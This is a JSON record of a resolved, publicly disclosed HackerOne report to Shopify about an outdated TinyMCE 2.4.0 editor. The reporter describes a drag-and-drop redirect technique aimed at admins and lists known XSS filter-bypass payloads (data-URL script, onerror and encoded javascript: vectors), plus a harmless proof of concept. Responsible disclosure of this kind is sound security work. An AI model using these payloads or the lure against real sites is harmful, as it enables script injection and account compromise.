{
  "id": 262230,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjIyMzA=",
  "url": "https://hackerone.com/reports/262230",
  "title": "Tinymce 2.4.0",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-08-22T14:25:51.537Z",
  "submitted_at": "2017-08-22T14:25:51.537Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "jelmer",
    "url": "/jelmer",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/636/5497b7f89b51e0320e32f2fd125a6dc9fe7e11dd_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 1382,
    "url": "https://hackerone.com/shopify",
    "handle": "shopify",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Shopify",
      "twitter_handle": "",
      "website": "https://www.shopify.com",
      "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-09-26T14:46:20.938Z",
  "bug_reporter_agreed_on_going_public_at": "2017-09-26T14:46:20.867Z",
  "team_member_agreed_on_going_public_at": "2017-09-25T20:51:47.418Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello,\n\nThe following url\n  * https://app.shopify.com//services/mobile_app/rte\n\nLoads https://cdn.shopify.com/s/assets/mobile_app/rte-bundle-f044a6c638b6c0500848c772dd5c86bf0eb2b27516c0860c6d3ddafde42231e2.js which is a minified tinymce 2.4.0.\n\nThis version of tinymce has known vulnerabilities but in order to trigger them the attacker needs access to tinymce's functionality. To achieve this I came up with a drag drop scenario which goes as follows:\n  * Attacker lures Shopify admin to controlled website\n  * Attacker convinces admin to drag element on the page which has an ondragstart prop with event.dataTransfer.setData+text/html mime (event.dataTransfer.setData('text/html', payload))\n  * Immediatly after the drag the attacker redirects the user to Shopify. This does not violate the XFO 'DENY' setting (https://app.shopify.com//services/mobile_app/rte)\n  * Victim releases the mouse button after loading the tinymce and the dragged data gets rendered by tinymce (tinymce is fullscreen so it doesn't matter where you drop it on the screen)\n\nWhile I couldn't get a tinymce XSS to trigger it does illustrate an attacker can make tinymce render something. Underneath are the vulnerabilities I tried with associated payload.\n\n[XSS through a href data url](https://github.com/cybersecurityworks/Disclosed/issues/10)\n\n```\n<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=\" target=\"_blank\">Firfox</a>\n```\n[Filter confusion 1](https://github.com/tinymce/tinymce/issues/3114)\n```\n'\">><marquee><img src=x onerror=confirm(1)></marquee>\"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)>\n```\n[Filter confusion 2](https://hackerone.com/reports/81736) and [here](https://github.com/tinymce/tinymce/issues/2356)\n```\n<HTML xmlns: ><audio>\n<audio src=wp onerror=alert(0X1)>\n```\n[Filter confusion 3](https://github.com/tinymce/tinymce/issues/2132)\n```\n&ltg;?\">&ltg;iframe SRC=&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#101&#114&#116&#40&#39&#88&#83&#83&#39&#41>?>\n```\n\nWhile unable to create a proper PoC the availability of the vulnerable library presented in the way it is might be of your interest.\n\nHere is the poc:\n```\n<div draggable=\"true\" ondragstart=\"event.dataTransfer.setData('text/html', '<img src=\\'https://cdn.shopify.com/shopify-marketing_assets/static/shopify-favicon.png\\'/>'); document.location='https://app.shopify.com//services/mobile_app/rte'\">drag</div>\n```\nSave that as a html file, open with firefox, drag the div and release it after the page redirected. Tinymce will then render the favicon.\n\nConsidering the things that live under this subdomain + CSRF token handout on page successful exploitation of this could get pretty disastrous.",
  "bounty_amount": "2000.0",
  "formatted_bounty": "$2,000",
  "weakness": {
    "id": 63,
    "name": "Cross-site Scripting (XSS) - DOM"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 36,
  "voters": [
    "wargsec",
    "flamezzz",
    "jensec",
    "drsniper",
    "sp1d3rs",
    "bogdantc",
    "bl4de",
    "003random",
    "almroot",
    "tulswani",
    "and 26 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 4.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 418,
    "asset_type": "URL",
    "asset_identifier": "apps.shopify.com",
    "max_severity": "medium"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
